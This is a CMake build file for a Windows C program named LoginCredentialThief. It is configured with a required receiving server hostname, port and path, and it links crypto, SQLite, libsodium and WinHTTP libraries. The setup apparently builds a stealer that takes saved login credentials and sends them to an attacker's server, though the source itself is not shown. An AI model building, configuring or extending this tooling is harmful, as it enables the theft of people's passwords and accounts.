cmake_minimum_required(VERSION 3.10)

# Genearete "compile_commands.json" for ease of C lintering
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)

if(NOT CMAKE_BUILD_TYPE)
  set(CMAKE_BUILD_TYPE Release)
endif()

# Setting project information
project(LoginCredentialThief VERSION 1.0 LANGUAGES C)

# Setting config file to automatically generate Hostname, Port, Path, ... header file
set(CONFIGFILE "Config.h")

# Getting compliation options from CLI
option(HOSTNAME "Server Hostname")

option(PORT "Server Port")
if(NOT PORT)
  set(PORT 80)
endif()

option(PATH "Recieving Path")
if(NOT PATH)
  set(PATH "/")
endif()

# Throw error when there was no HOSTNAME in options ( REQUIRED )
if(NOT HOSTNAME)
  message(SEND_ERROR "No Hostname Specified!\n use -DHOSTNAME=\"Target IP/Hostname\"")
endif()

# Set C Version
set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED TRUE)

# Auto generate config header
configure_file(Config.h.in ${CONFIGFILE})

file(GLOB src 
  "${PROJECT_SOURCE_DIR}/src/*.c")

file(GLOB include 
  "${PROJECT_SOURCE_DIR}/include/*.h")

# Create executable
add_executable(${PROJECT_NAME} ${src} ${include})

# Pass CONFIGFILE to project as a preprocessor ( to be included easily )
target_compile_definitions(${PROJECT_NAME} PRIVATE CONFIG="${CONFIGFILE}")

string(TOLOWER ${CMAKE_BUILD_TYPE} BTL)

# Pass build type to project
if(${BTL} STREQUAL "debug")
  add_compile_definitions(DEBUG=1)
elseif(${BTL} STREQUAL "release")
  add_compile_definitions(RELEASE=1)
elseif(${BTL} STREQUAL "minsizerel")
  add_compile_definitions(RELEASE=1)
elseif(${BTL} STREQUAL "relwithdebinfo")
  add_compile_definitions(DEBUG=1)
else()
  message(SEND_ERROR "Unknown Build Type")
endif()

# Add project binary directory to include path ( for including CONFIGFILE )
target_include_directories(${PROJECT_NAME} PUBLIC 
  "${PROJECT_SOURCE_DIR}/include"
  ${PROJECT_BINARY_DIR}
  )

target_link_directories( ${PROJECT_NAME} PRIVATE 
  "${PROJECT_SOURCE_DIR}/lib"
  )
target_link_libraries( ${PROJECT_NAME} PRIVATE base64 crypt32 sqlite3 sodium winhttp json)
